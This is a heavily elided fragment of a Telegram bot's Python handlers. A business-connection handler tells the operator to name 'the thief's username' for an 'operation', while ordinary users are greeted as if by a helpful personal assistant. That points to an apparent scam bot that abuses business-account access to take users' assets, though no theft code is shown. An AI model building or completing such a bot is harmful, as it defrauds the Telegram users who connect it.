...
async def handle_business_connect(business_connection: BusinessConnection):
    try:
        ...
        await bot.send_message(user_id, "✅ Бот успешно подключен! Укажите Username вора для проведения операции")
...
async def start_command(message: Message):
    ...
    if message.from_user.id != ADMIN_ID:
        welcome_text = """
👋 <b>Приветствую!</b> Я — ваш личный <i>Бот помощник</i>! ✨
